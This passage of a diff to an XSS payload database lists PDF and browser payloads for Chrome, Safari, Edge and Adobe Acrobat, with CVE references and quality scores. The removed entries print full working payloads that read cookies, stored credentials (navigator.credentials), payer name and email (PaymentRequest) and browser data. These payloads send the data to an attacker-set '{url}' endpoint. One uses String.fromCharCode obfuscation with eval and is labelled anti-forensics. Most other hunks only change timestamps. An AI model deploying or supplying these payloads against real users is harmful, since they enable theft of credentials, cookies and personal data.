-      "last_updated": "2025-07-30T14:38:01.949444"
-    },
-    {
-      "id": "advanced_xss_023",
-      "category": "credential_management",
-      "browser": "chrome",
-      "technique": "chrome_credential_management",
-      "payload": "(function(){try{if(typeof navigator.credentials!=='undefined'){navigator.credentials.get({password:true,federated:{providers:['https://accounts.google.com','https://www.facebook.com']}}).then(function(credential){if(credential){var data={browser:'chrome',type:'credential_management',credentialType:credential.type,id:credential.id,timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}else{throw new Error('No credentials available');}}).catch(function(e){throw e;});}else{throw new Error('Credential Management API not supported');}}catch(e){try{var x=new XMLHttpRequest();x.open('GET','{url}?chrome_credential_failed='+encodeURIComponent(e.toString()),true);x.send();}catch(e2){app.alert('Chrome Credential Management exploitation failed: '+e2);}}}());",
-      "description": "Chrome Credential Management API exploitation for stored credential access",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
-      "detected_techniques": [
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 70,
-      "payload_length": 862,
-      "last_updated": "2025-07-30T14:38:01.949572"
-    },
-    {
-      "id": "advanced_xss_024",
-      "category": "performance_timeline",
-      "browser": "safari",
-      "technique": "safari_performance_timeline",
-      "payload": "(function(){try{if(typeof performance!=='undefined'&&typeof performance.getEntriesByType!=='undefined'){var entries=performance.getEntriesByType('navigation');var timing=performance.timing;var data={browser:'safari',type:'performance_timeline',navigationEntries:entries.length,timing:{loadEventEnd:timing.loadEventEnd,domContentLoadedEventEnd:timing.domContentLoadedEventEnd,responseEnd:timing.responseEnd},timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}else{throw new Error('Performance Timeline API not supported');}}catch(e){try{navigator.sendBeacon('{url}?safari_performance_failed='+encodeURIComponent(e.toString()));}catch(e2){app.alert('Safari Performance Timeline exploitation failed: '+e2);}}}());",
-      "description": "Safari Performance Timeline API exploitation for timing information disclosure",
-      "risk_level": "low",
-      "cve_reference": "CVE-2019-8625, CVE-2020-3899",
-      "detected_techniques": [
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 70,
-      "payload_length": 820,
-      "last_updated": "2025-07-30T14:38:01.949599"
+      "last_updated": "2025-07-30T14:35:26.934411"
     },
     {
       "id": "xss_pdf_0001",
@@ -723,7 +333,7 @@
       ],
       "quality_score": 65,
       "payload_length": 134,
-      "last_updated": "2025-07-30T14:38:01.946841"
+      "last_updated": "2025-07-30T14:35:26.933381"
     },
     {
       "id": "xss_pdf_0004",
@@ -739,7 +349,7 @@
       ],
       "quality_score": 65,
       "payload_length": 170,
-      "last_updated": "2025-07-30T14:38:01.946862"
+      "last_updated": "2025-07-30T14:35:26.933424"
     },
     {
       "id": "xss_pdf_0007",
@@ -755,7 +365,7 @@
       ],
       "quality_score": 65,
       "payload_length": 138,
-      "last_updated": "2025-07-30T14:38:01.946884"
+      "last_updated": "2025-07-30T14:35:26.933458"
     },
     {
       "id": "xss_pdf_0010",
@@ -771,7 +381,7 @@
       ],
       "quality_score": 65,
       "payload_length": 114,
-      "last_updated": "2025-07-30T14:38:01.946905"
+      "last_updated": "2025-07-30T14:35:26.933481"
     },
     {
       "id": "xss_pdf_0016",
@@ -787,7 +397,7 @@
       ],
       "quality_score": 65,
       "payload_length": 142,
-      "last_updated": "2025-07-30T14:38:01.946948"
+      "last_updated": "2025-07-30T14:35:26.933523"
     },
     {
       "id": "xss_pdf_0019",
@@ -803,7 +413,7 @@
       ],
       "quality_score": 65,
       "payload_length": 130,
-      "last_updated": "2025-07-30T14:38:01.946969"
+      "last_updated": "2025-07-30T14:35:26.933544"
     },
     {
       "id": "firefox_003",
@@ -819,57 +429,7 @@
       ],
       "quality_score": 65,
       "payload_length": 109,
-      "last_updated": "2025-07-30T14:38:01.947730"
-    },
-    {
-      "id": "advanced_xss_001",
-      "category": "sandbox_escape",
-      "browser": "chrome",
-      "technique": "advanced_chrome_sandbox_escape",
-      "payload": "(function(){try{var p=parent||top||window.parent;if(p&&p.window){var d=p.document||p.window.document;if(d){var f=d.createElement('form');f.method='POST';f.action='{url}?type=chrome_escape';var i=d.createElement('input');i.name='data';i.value='chrome_sandbox_escaped:'+navigator.userAgent+'|'+document.location.href+'|'+document.cookie;f.appendChild(i);d.body.appendChild(f);f.submit();}}}catch(e){try{app.getURL({url:'{url}?chrome_fallback='+encodeURIComponent(e.toString())});}catch(e2){console.log('Chrome XSS blocked:',e2);}}})();",
-      "description": "Chrome PDFium sandbox escape via form submission with fallback URL launching",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166, CVE-2022-0971",
-      "detected_techniques": [
-        "dom_manipulation"
-      ],
-      "quality_score": 65,
-      "payload_length": 533,
-      "last_updated": "2025-07-30T14:38:01.949000"
-    },
-    {
-      "id": "advanced_xss_004",
-      "category": "command_execution",
-      "browser": "adobe",
-      "technique": "adobe_acrobat_cmd_exec",
-      "payload": "try{if(app.execMenuItem){app.execMenuItem('Print');}var payload='app.launchURL(\"{url}?adobe_exec=\"+encodeURIComponent(app.viewerVersion+\"|\"+app.platform+\"|\"+app.language));';eval(payload);}catch(e){try{app.getURL({url:'{url}?adobe_geturl='+encodeURIComponent(e.toString())+'&ver='+app.viewerVersion});}catch(e2){try{this.submitForm('{url}?adobe_submit=error');}catch(e3){app.alert('Adobe execution blocked: '+e3);}}}",
-      "description": "Adobe Acrobat command execution via execMenuItem and launchURL with version detection",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2018-4990, CVE-2019-7839, CVE-2020-3793",
-      "detected_techniques": [
-        "dynamic_execution",
-        "pdf_specific"
-      ],
-      "quality_score": 65,
-      "payload_length": 416,
-      "last_updated": "2025-07-30T14:38:01.949064"
-    },
-    {
-      "id": "advanced_xss_011",
-      "category": "anti_forensics",
-      "browser": "adobe",
-      "technique": "adobe_anti_forensics",
-      "payload": "try{var payload=String.fromCharCode(116,114,121,123,97,112,112,46,103,101,116,85,82,76,40,123,117,114,108,58,39,123,117,114,108,125,63,97,100,111,98,101,95,97,110,116,105,95,102,111,114,101,110,115,105,99,115,61,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,41,125,41,59,125,99,97,116,99,104,40,101,41,123,97,112,112,46,97,108,101,114,116,40,39,65,110,116,105,45,102,111,114,101,110,115,105,99,115,32,102,97,105,108,101,100,58,32,39,43,101,41,59,125);eval(payload);var trace=new Error().stack;if(trace){var cleanTrace=trace.replace(/eval/g,'exec').replace(/anonymous/g,'function');}}catch(e){app.alert('Adobe anti-forensics blocked: '+e);}",
-      "description": "Adobe anti-forensics payload using character code obfuscation and stack trace manipulation",
-      "risk_level": "high",
-      "cve_reference": "CVE-2018-4990, CVE-2019-7839",
-      "detected_techniques": [
-        "dynamic_execution",
-        "pdf_specific"
-      ],
-      "quality_score": 65,
-      "payload_length": 752,
-      "last_updated": "2025-07-30T14:38:01.949226"
+      "last_updated": "2025-07-30T14:35:26.934317"
     },
     {
       "id": "firefox_005",
@@ -884,7 +444,7 @@
       ],
       "quality_score": 60,
       "payload_length": 76,
-      "last_updated": "2025-07-30T14:38:01.947752"
+      "last_updated": "2025-07-30T14:35:26.934339"
     },
     {
       "id": "firefox_015",
@@ -899,41 +459,7 @@
       ],
       "quality_score": 60,
       "payload_length": 103,
-      "last_updated": "2025-07-30T14:38:01.947871"
-    },
-    {
-      "id": "advanced_xss_020",
-      "category": "indexeddb_exploitation",
-      "browser": "chrome",
-      "technique": "chrome_indexeddb_exploitation",
-      "payload": "(function(){try{var request=indexedDB.open('XSSDatabase',1);request.onerror=function(e){throw new Error('IndexedDB open failed');};request.onupgradeneeded=function(e){var db=e.target.result;var objectStore=db.createObjectStore('payloads',{keyPath:'id'});objectStore.add({id:1,data:'chrome_indexeddb_exploitation',timestamp:Date.now()});};request.onsuccess=function(e){var db=e.target.result;var transaction=db.transaction(['payloads'],'readonly');var objectStore=transaction.objectStore('payloads');var getRequest=objectStore.get(1);getRequest.onsuccess=function(e){var result=e.target.result;if(result){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'chrome',type:'indexeddb_exploitation',data:result,timestamp:Date.now()}));}};db.close();};}catch(e){try{localStorage.setItem('xss_fallback',JSON.stringify({browser:'chrome',type:'indexeddb_failed',error:e.toString(),timestamp:Date.now()}));var x=new XMLHttpRequest();x.open('GET','{url}?chrome_indexeddb_failed='+encodeURIComponent(e.toString()),true);x.send();}catch(e2){app.alert('Chrome IndexedDB exploitation failed: '+e2);}}}());",
-      "description": "Chrome IndexedDB exploitation for persistent data storage and retrieval",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2019-5786, CVE-2020-6418",
-      "detected_techniques": [
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 60,
-      "payload_length": 1179,
-      "last_updated": "2025-07-30T14:38:01.949481"
-    },
-    {
-      "id": "advanced_xss_022",
-      "category": "payment_request_api",
-      "browser": "edge",
-      "technique": "edge_payment_request_api",
-      "payload": "(function(){try{if(typeof PaymentRequest!=='undefined'){var methods=[{supportedMethods:'basic-card',data:{supportedNetworks:['visa','mastercard']}}];var details={total:{label:'XSS Test',amount:{currency:'USD',value:'0.01'}},displayItems:[{label:'XSS Payload',amount:{currency:'USD',value:'0.01'}}]};var options={requestPayerName:true,requestPayerEmail:true};var request=new PaymentRequest(methods,details,options);request.show().then(function(response){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'edge',type:'payment_request_api',payerName:response.payerName,payerEmail:response.payerEmail,timestamp:Date.now()}));response.complete('success');}).catch(function(e){throw e;});}else{throw new Error('PaymentRequest API not supported');}}catch(e){try{window.open('{url}?edge_payment_failed='+encodeURIComponent(e.toString()),'_blank');}catch(e2){app.alert('Edge PaymentRequest API exploitation failed: '+e2);}}}());",
-      "description": "Microsoft Edge PaymentRequest API exploitation for user information disclosure",
-      "risk_level": "high",
-      "cve_reference": "CVE-2020-0674, CVE-2021-26411",
-      "detected_techniques": [
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 60,
-      "payload_length": 1009,
-      "last_updated": "2025-07-30T14:38:01.949542"
+      "last_updated": "2025-07-30T14:35:26.934457"
     },
     {
       "id": "xss_pdf_0013",
@@ -949,7 +475,7 @@
       ],
       "quality_score": 55,
       "payload_length": 98,
-      "last_updated": "2025-07-30T14:38:01.946927"
+      "last_updated": "2025-07-30T14:35:26.933503"
     },
     {
       "id": "chrome_015",
@@ -964,7 +490,7 @@
       ],
       "quality_score": 55,
       "payload_length": 202,
-      "last_updated": "2025-07-30T14:38:01.947287"
+      "last_updated": "2025-07-30T14:35:26.933902"
     },
     {
       "id": "safari_004",
@@ -979,7 +505,7 @@
       ],
       "quality_score": 55,
       "payload_length": 107,
-      "last_updated": "2025-07-30T14:38:01.948423"
+      "last_updated": "2025-07-30T14:35:26.935332"
     },
     {
       "id": "chrome_001",
@@ -995,7 +521,7 @@
       ],
       "quality_score": 50,
       "payload_length": 140,
-      "last_updated": "2025-07-30T14:38:01.947124"
+      "last_updated": "2025-07-30T14:35:26.933739"
     },
     {
       "id": "chrome_002",
@@ -1010,7 +536,7 @@
       ],
       "quality_score": 50,
       "payload_length": 164,
-      "last_updated": "2025-07-30T14:38:01.947138"
+      "last_updated": "2025-07-30T14:35:26.933754"
     },
     {
       "id": "firefox_004",
@@ -1025,7 +551,7 @@
       ],
       "quality_score": 50,
       "payload_length": 98,
-      "last_updated": "2025-07-30T14:38:01.947742"
+      "last_updated": "2025-07-30T14:35:26.934329"
     },
     {
       "id": "firefox_013",
@@ -1040,7 +566,7 @@
       ],
       "quality_score": 50,
       "payload_length": 85,
-      "last_updated": "2025-07-30T14:38:01.947846"
+      "last_updated": "2025-07-30T14:35:26.934433"
     },
     {
       "id": "safari_010",
@@ -1056,7 +582,7 @@
       ],
       "quality_score": 50,
       "payload_length": 115,
-      "last_updated": "2025-07-30T14:38:01.948459"
+      "last_updated": "2025-07-30T14:35:26.935388"
     },
     {
       "id": "firefox_006",
@@ -1072,7 +598,7 @@
       ],
       "quality_score": 45,
       "payload_length": 103,
-      "last_updated": "2025-07-30T14:38:01.947762"
+      "last_updated": "2025-07-30T14:35:26.934350"
     },
     {
       "id": "firefox_008",
@@ -1087,7 +613,7 @@
       ],
       "quality_score": 45,
       "payload_length": 142,
-      "last_updated": "2025-07-30T14:38:01.947784"
+      "last_updated": "2025-07-30T14:35:26.934371"
     },
     {
       "id": "firefox_009",
@@ -1102,7 +628,7 @@
       ],
       "quality_score": 45,
       "payload_length": 234,
-      "last_updated": "2025-07-30T14:38:01.947801"
+      "last_updated": "2025-07-30T14:35:26.934388"
     },
     {
       "id": "firefox_010",
@@ -1117,7 +643,7 @@
       ],
       "quality_score": 45,
       "payload_length": 119,
-      "last_updated": "2025-07-30T14:38:01.947811"
+      "last_updated": "2025-07-30T14:35:26.934398"
     },
     {
       "id": "safari_003",
@@ -1132,7 +658,7 @@
       ],
       "quality_score": 45,
       "payload_length": 73,
-      "last_updated": "2025-07-30T14:38:01.948491"
+      "last_updated": "2025-07-30T14:35:26.935320"
     },
     {
       "id": "chrome_012",
@@ -1148,7 +674,7 @@
       ],
       "quality_score": 40,
       "payload_length": 153,
-      "last_updated": "2025-07-30T14:38:01.947248"
+      "last_updated": "2025-07-30T14:35:26.933867"
     },
     {
       "id": "firefox_012",
@@ -1161,7 +687,7 @@
       "detected_techniques": [],
       "quality_score": 40,
       "payload_length": 131,
-      "last_updated": "2025-07-30T14:38:01.947836"
+      "last_updated": "2025-07-30T14:35:26.934423"
     },
     {
       "id": "firefox_014",
@@ -1174,7 +700,7 @@
       "detected_techniques": [],
       "quality_score": 40,
       "payload_length": 103,
-      "last_updated": "2025-07-30T14:38:01.947859"
+      "last_updated": "2025-07-30T14:35:26.934446"
     },
     {
       "id": "safari_011",
@@ -1189,7 +715,7 @@
       ],
       "quality_score": 40,
       "payload_length": 200,
-      "last_updated": "2025-07-30T14:38:01.948521"
+      "last_updated": "2025-07-30T14:35:26.935405"
     },
     {
       "id": "chrome_008",
@@ -1202,7 +728,7 @@
       "detected_techniques": [],
       "quality_score": 35,
       "payload_length": 100,
-      "last_updated": "2025-07-30T14:38:01.947201"
+      "last_updated": "2025-07-30T14:35:26.933818"
     },
     {
       "id": "chrome_010",
@@ -1215,7 +741,7 @@
       "detected_techniques": [],
       "quality_score": 35,
       "payload_length": 144,
-      "last_updated": "2025-07-30T14:38:01.947224"
+      "last_updated": "2025-07-30T14:35:26.933843"
     },
     {
       "id": "chrome_011",
@@ -1230,7 +756,7 @@
       ],
       "quality_score": 35,
       "payload_length": 133,
-      "last_updated": "2025-07-30T14:38:01.947237"
+      "last_updated": "2025-07-30T14:35:26.933856"
     },
     {
       "id": "chrome_013",
@@ -1245,7 +771,7 @@
       ],
       "quality_score": 35,
       "payload_length": 128,
-      "last_updated": "2025-07-30T14:38:01.947264"
+      "last_updated": "2025-07-30T14:35:26.933879"
     },
     {
       "id": "chrome_014",
@@ -1260,7 +786,7 @@
       ],
       "quality_score": 30,
       "payload_length": 81,
-      "last_updated": "2025-07-30T14:38:01.947273"
+      "last_updated": "2025-07-30T14:35:26.933889"
     },
     {
       "id": "safari_002",
@@ -1275,7 +801,7 @@
       ],
       "quality_score": 30,
       "payload_length": 88,
-      "last_updated": "2025-07-30T14:38:01.948559"
+      "last_updated": "2025-07-30T14:35:26.935308"
     },
     {
       "id": "safari_009",
@@ -1290,7 +816,7 @@
       ],
       "quality_score": 30,
       "payload_length": 95,
-      "last_updated": "2025-07-30T14:38:01.948568"
+      "last_updated": "2025-07-30T14:35:26.935378"
     },
     {
       "id": "safari_012",
@@ -1305,7 +831,7 @@
       ],
       "quality_score": 30,
       "payload_length": 94,
-      "last_updated": "2025-07-30T14:38:01.948577"
+      "last_updated": "2025-07-30T14:35:26.935414"
     },
     {
       "id": "chrome_009",
@@ -1318,7 +844,7 @@
       "detected_techniques": [],
       "quality_score": 25,
       "payload_length": 95,
-      "last_updated": "2025-07-30T14:38:01.947211"
+      "last_updated": "2025-07-30T14:35:26.933828"
     },
     {
       "id": "adobe_014",
@@ -1333,7 +859,7 @@
       ],
       "quality_score": 25,
       "payload_length": 66,
-      "last_updated": "2025-07-30T14:38:01.947521"
+      "last_updated": "2025-07-30T14:35:26.934131"
     },
     {
       "id": "firefox_007",
@@ -1346,7 +872,7 @@
       "detected_techniques": [],
       "quality_score": 25,
       "payload_length": 101,
-      "last_updated": "2025-07-30T14:38:01.947773"
+      "last_updated": "2025-07-30T14:35:26.934360"
     },
     {
       "id": "adobe_003",
@@ -1359,7 +885,7 @@
       "detected_techniques": [],
       "quality_score": 20,
       "payload_length": 108,
-      "last_updated": "2025-07-30T14:38:01.947425"
+      "last_updated": "2025-07-30T14:35:26.934037"
     },
     {
       "id": "adobe_015",
@@ -1372,7 +898,7 @@
       "detected_techniques": [],
       "quality_score": 20,
       "payload_length": 50,
-      "last_updated": "2025-07-30T14:38:01.947530"
+      "last_updated": "2025-07-30T14:35:26.934139"
     },
     {
       "id": "edge_001",
@@ -1387,7 +913,7 @@
       ],
       "quality_score": 20,
       "payload_length": 43,
-      "last_updated": "2025-07-30T14:38:01.948608"
+      "last_updated": "2025-07-30T14:35:26.935122"
     },
     {
       "id": "adobe_002",
@@ -1400,7 +926,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 52,
-      "last_updated": "2025-07-30T14:38:01.947410"
+      "last_updated": "2025-07-30T14:35:26.934023"
     },
     {
       "id": "adobe_006",
@@ -1413,7 +939,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 56,
-      "last_updated": "2025-07-30T14:38:01.947449"
+      "last_updated": "2025-07-30T14:35:26.934061"
     },
     {
       "id": "adobe_007",
@@ -1426,7 +952,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 76,
-      "last_updated": "2025-07-30T14:38:01.947459"
+      "last_updated": "2025-07-30T14:35:26.934070"
     },
     {
       "id": "adobe_008",
@@ -1439,7 +965,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 74,
-      "last_updated": "2025-07-30T14:38:01.947468"
+      "last_updated": "2025-07-30T14:35:26.934079"
     },
     {
       "id": "adobe_009",
@@ -1454,7 +980,7 @@
       ],
       "quality_score": 10,
       "payload_length": 89,
-      "last_updated": "2025-07-30T14:38:01.947478"
+      "last_updated": "2025-07-30T14:35:26.934089"
     },
     {
       "id": "adobe_010",
@@ -1467,7 +993,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 90,
-      "last_updated": "2025-07-30T14:38:01.947488"
+      "last_updated": "2025-07-30T14:35:26.934098"
     },
     {
       "id": "edge_003",
@@ -1480,7 +1006,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 60,
-      "last_updated": "2025-07-30T14:38:01.948642"
+      "last_updated": "2025-07-30T14:35:26.935143"
     },
     {
       "id": "edge_004",
@@ -1493,7 +1019,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 58,
-      "last_updated": "2025-07-30T14:38:01.948650"
+      "last_updated": "2025-07-30T14:35:26.935152"
     },
     {
       "id": "edge_005",
@@ -1506,7 +1032,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 56,
-      "last_updated": "2025-07-30T14:38:01.948662"
+      "last_updated": "2025-07-30T14:35:26.935161"
     },
     {
       "id": "edge_006",
@@ -1519,7 +1045,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 50,
-      "last_updated": "2025-07-30T14:38:01.948686"
+      "last_updated": "2025-07-30T14:35:26.935168"
     },
     {
       "id": "edge_007",
@@ -1532,7 +1058,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 85,
-      "last_updated": "2025-07-30T14:38:01.948698"
+      "last_updated": "2025-07-30T14:35:26.935177"
     },
     {
       "id": "edge_008",
@@ -1545,7 +1071,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 65,
-      "last_updated": "2025-07-30T14:38:01.948707"
+      "last_updated": "2025-07-30T14:35:26.935186"
     },
     {
       "id": "edge_010",
@@ -1558,7 +1084,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 75,
-      "last_updated": "2025-07-30T14:38:01.948716"
+      "last_updated": "2025-07-30T14:35:26.935203"
     },
     {
       "id": "edge_011",
@@ -1573,7 +1099,7 @@
       ],
       "quality_score": 10,
       "payload_length": 70,
-      "last_updated": "2025-07-30T14:38:01.948725"
+      "last_updated": "2025-07-30T14:35:26.935211"
     },
     {
       "id": "edge_012",
@@ -1588,7 +1114,7 @@
       ],
       "quality_score": 10,
       "payload_length": 71,
-      "last_updated": "2025-07-30T14:38:01.948734"
+      "last_updated": "2025-07-30T14:35:26.935222"
     },
     {
       "id": "safari_005",
@@ -1601,7 +1127,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 98,
-      "last_updated": "2025-07-30T14:38:01.948743"
+      "last_updated": "2025-07-30T14:35:26.935343"
     },
     {
       "id": "safari_006",
@@ -1614,7 +1140,7 @@
       "detected_techniques": [],
       "quality_score": 10,
       "payload_length": 89,
-      "last_updated": "2025-07-30T14:38:01.948752"
+      "last_updated": "2025-07-30T14:35:26.935352"
     },
     {
       "id": "safari_007",
@@ -1629,7 +1155,7 @@
       ],
       "quality_score": 10,
       "payload_length": 59,
-      "last_updated": "2025-07-30T14:38:01.948760"
+      "last_updated": "2025-07-30T14:35:26.935361"
     },
     {
       "id": "safari_008",
@@ -1644,7 +1170,7 @@
       ],
       "quality_score": 10,
       "payload_length": 70,
-      "last_updated": "2025-07-30T14:38:01.948768"
+      "last_updated": "2025-07-30T14:35:26.935369"
     },
     {
       "id": "chrome_004",
@@ -1659,7 +1185,7 @@
       ],
       "quality_score": 5,
       "payload_length": 42,
-      "last_updated": "2025-07-30T14:38:01.947163"
+      "last_updated": "2025-07-30T14:35:26.933779"
     },
     {
       "id": "chrome_005",
@@ -1674,7 +1200,7 @@
       ],
       "quality_score": 5,
       "payload_length": 37,
-      "last_updated": "2025-07-30T14:38:01.947172"
+      "last_updated": "2025-07-30T14:35:26.933788"
     },
     {
       "id": "chrome_006",
@@ -1687,7 +1213,7 @@
       "detected_techniques": [],
       "quality_score": 5,
       "payload_length": 40,
-      "last_updated": "2025-07-30T14:38:01.947180"
+      "last_updated": "2025-07-30T14:35:26.933797"
     },
     {
       "id": "chrome_007",
@@ -1700,7 +1226,7 @@
       "detected_techniques": [],
       "quality_score": 5,
       "payload_length": 37,
-      "last_updated": "2025-07-30T14:38:01.947188"
+      "last_updated": "2025-07-30T14:35:26.933804"
     },
     {
       "id": "firefox_001",
@@ -1713,7 +1239,7 @@
       "detected_techniques": [],
       "quality_score": 5,
       "payload_length": 22,
-      "last_updated": "2025-07-30T14:38:01.947709"
+      "last_updated": "2025-07-30T14:35:26.934297"
     },
     {
       "id": "adobe_001",
@@ -1726,7 +1252,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 29,
-      "last_updated": "2025-07-30T14:38:01.947397"
+      "last_updated": "2025-07-30T14:35:26.934010"
     },
     {
       "id": "adobe_004",
@@ -1739,7 +1265,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 36,
-      "last_updated": "2025-07-30T14:38:01.947433"
+      "last_updated": "2025-07-30T14:35:26.934045"
     },
     {
       "id": "adobe_005",
@@ -1752,7 +1278,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 30,
-      "last_updated": "2025-07-30T14:38:01.947441"
+      "last_updated": "2025-07-30T14:35:26.934052"
     },
     {
       "id": "adobe_011",
@@ -1765,7 +1291,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 33,
-      "last_updated": "2025-07-30T14:38:01.947495"
+      "last_updated": "2025-07-30T14:35:26.934106"
     },
     {
       "id": "adobe_012",
@@ -1778,7 +1304,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 21,
-      "last_updated": "2025-07-30T14:38:01.947503"
+      "last_updated": "2025-07-30T14:35:26.934113"
     },
     {
       "id": "adobe_013",
@@ -1791,7 +1317,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 31,
-      "last_updated": "2025-07-30T14:38:01.947512"
+      "last_updated": "2025-07-30T14:35:26.934122"
     },
     {
       "id": "edge_002",
@@ -1804,7 +1330,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 32,
-      "last_updated": "2025-07-30T14:38:01.948811"
+      "last_updated": "2025-07-30T14:35:26.935134"
     },
     {
       "id": "edge_009",
@@ -1817,7 +1343,7 @@
       "detected_techniques": [],
       "quality_score": 0,
       "payload_length": 40,
-      "last_updated": "2025-07-30T14:38:01.948821"
+      "last_updated": "2025-07-30T14:35:26.935194"
     }
   ]
 }
